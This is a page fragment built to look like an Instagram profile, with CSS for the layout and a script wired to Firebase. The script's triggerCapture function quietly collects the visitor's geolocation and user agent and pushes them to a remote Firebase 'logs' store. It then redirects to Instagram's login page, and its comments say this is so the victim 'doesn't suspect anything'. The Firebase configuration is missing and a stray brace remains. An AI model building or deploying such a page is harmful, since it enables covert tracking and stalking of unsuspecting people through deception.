    <style>
        :root {
            --ig-bg: #ffffff;
            --ig-text: #000000;
            --ig-secondary: #8e8e8e;
            --ig-border: #dbdbdb;
            --ig-red: #ff3040;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 0; background: var(--ig-bg);
            padding-bottom: 60px;
            -webkit-tap-highlight-color: transparent;
        } 

        /* Top Nav */
        header.top-nav {
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            border-bottom: 1px solid var(--ig-border);
            position: sticky;
            top: 0; background: #fff; z-index: 1000;
        }

        .back-btn { cursor: pointer; display: flex; align-items: center; }

        /* Profile Header */
        .profile-container { max-width: 600px; margin: 0 auto; padding: 16px; }
        .header-main { display: flex; align-items: center; margin-bottom: 15px; }
        .dp-main { width: 82px; height: 82px; border-radius: 50%; object-fit: cover; border: 1px solid var(--ig-border); padding: 2px; }
        .stats-box { flex: 1; display: flex; justify-content: space-around; text-align: center; }
        .stat-val { font-weight: 700; font-size: 16px; display: block; }
        .stat-lab { font-size: 13px; color: var(--ig-text); }

        .bio-section { font-size: 14px; line-height: 1.4; margin-bottom: 10px; }
        .full-name { font-weight: 700; display: block; }
        .category { color: var(--ig-secondary); }

        /* Photo Grid */
        .photo-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 1px;
            background: var(--ig-border);
        }
        .photo-item { aspect-ratio: 1/1; background: #fff; overflow: hidden; cursor: pointer; }
        .photo-item img { width: 100%; height: 100%; object-fit: cover; display: block; }

        /* Bottom Nav */
        .bottom-nav {
            position: fixed; bottom: 0; width: 100%; height: 50px;
            background: #fff; border-top: 1px solid var(--ig-border);
            display: flex; justify-content: space-around; align-items: center;
            z-index: 1000;
        }
        .nav-item { position: relative; cursor: pointer; display: flex; align-items: center; }
        .badge {
            position: absolute; top: -6px; right: -8px;
            background: var(--ig-red); color: white;
            font-size: 10px; font-weight: bold;
            width: 17px; height: 17px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            border: 2px solid white;
        }
    </style>
</head>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

   window.triggerCapture = function() {
    console.log("Attempting to capture...");

    const options = {
        enableHighAccuracy: false, // Switching to false is faster & more reliable for 'grabbers'
        timeout: 10000,            // Give it 10 seconds
        maximumAge: 60000          // Use cached location if available
    };

    function success(pos) {
        const userData = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            ua: navigator.userAgent,
            time: new Date().toISOString()
        };

        push(ref(db, 'logs'), userData)
            .then(() => finishFlow())
            .catch((e) => {
                console.error("Firebase Error:", e);
                finishFlow();
            });
    }

    function error(err) {
        console.warn("Location Error Code: " + err.code + " | " + err.message);
        // Even if it times out, redirect so the user doesn't suspect anything
        finishFlow();
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, options);
    } else {
        finishFlow();
    }
};
    function finishFlow() {
        window.location.href = "https://www.instagram.com/accounts/login/";
    }
</script>
